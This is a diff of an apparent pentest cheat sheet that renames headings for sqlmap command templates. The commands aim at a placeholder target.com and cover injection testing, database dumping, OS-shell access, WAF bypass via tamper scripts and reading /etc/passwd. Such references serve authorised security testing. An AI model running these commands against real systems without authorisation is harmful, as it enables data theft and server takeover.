@@ -6,7 +6,7 @@
 
 ---
 
-## GET Parameter Injection
+## inject sqli GET param
 Test a URL GET parameter for SQL injection.
 
 ```bash
@@ -17,7 +17,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --random-agent -
 
 ---
 
-## POST Parameter Injection
+## inject sqli POST param
 Test POST parameters for SQL injection.
 
 ```bash
@@ -28,7 +28,7 @@ sqlmap -u "{{URL:url:http://target.com/login.php}}" --data="{{POSTDATA:str:usern
 
 ---
 
-## From Burp Suite Request File
+## inject sqli burp request file
 Use a saved Burp request file as input for sqlmap.
 
 ```bash
@@ -39,7 +39,7 @@ sqlmap -r {{REQUEST_FILE:file:request.txt}} --batch --random-agent
 
 ---
 
-## Cookie-Based Injection
+## inject sqli cookie param
 Test injection in cookie parameters.
 
 ```bash
@@ -50,7 +50,7 @@ sqlmap -u "{{URL:url:http://target.com/dashboard.php}}" --cookie="{{COOKIE:str:s
 
 ---
 
-## Enumerate Databases
+## enum databases sqli
 List all databases on the backend DBMS.
 
 ```bash
@@ -61,7 +61,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --dbs --batch --random-a
 
 ---
 
-## Dump Tables and Data
+## dump table data sqli
 Dump a specific table from a database.
 
 ```bash
@@ -72,7 +72,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" -D {{DATABASE:str:target
 
 ---
 
-## OS Shell via SQL Injection
+## sqli os shell rce
 Attempt to gain an OS shell through SQL injection.
 
 ```bash
@@ -83,7 +83,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell --batch --ran
 
 ---
 
-## With Tamper Scripts
+## bypass WAF tamper scripts sqli
 Use tamper scripts to bypass WAF or input filters.
 
 ```bash
@@ -94,7 +94,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --tamper={{TAMPER:str:sp
 
 ---
 
-## High Level and Risk Scan
+## scan sqli high level risk
 Run sqlmap with maximum detection level and risk settings.
 
 ```bash
@@ -105,7 +105,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --level={{LEVEL:int:5}} 
 
 ---
 
-## Batch Mode Full Auto
+## dump all sqli full auto
 Fully automated scan: detect, enumerate, and dump everything.
 
 ```bash
@@ -116,7 +116,7 @@ sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --random-agent -
 
 ---
 
-## Two-Step Injection (--second-req)
+## inject second order sqli
 Use a second request file for stored-and-executed (second-order) injections.
 
 ```bash
@@ -127,7 +127,7 @@ sqlmap -r {{REQ:file:request.txt}} -p {{PARAM:str:genres}} --second-req {{SECOND
 
 ---
 
-## Burp Proxy Routing
+## route sqli burp proxy
 Route sqlmap traffic through a local Burp proxy for inspection.
 
 ```bash
@@ -138,7 +138,7 @@ sqlmap -r {{REQ:file:request.txt}} --proxy http://127.0.0.1:8080 --tamper=space2
 
 ---
 
-## URL List Injection (-m)
+## inject sqli url list bulk
 Test multiple URLs from a file in one run.
 
 ```bash
@@ -149,7 +149,7 @@ sqlmap -m {{URL_LIST:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 -
 
 ---
 
-## Read File via SQLi
+## sqli read file filesystem
 Read a file from the database server filesystem (when DBMS user has FILE priv).
 
 ```bash
@@ -160,7 +160,7 @@ sqlmap -r {{REQ:file:request.txt}} --batch --file-read={{REMOTE_FILE:str:/etc/pa
 
 ---
 
-## Limit Techniques
+## limit sqli techniques
 Restrict sqlmap to specific injection techniques (B,E,U,S,T,Q).
 
 ```bash
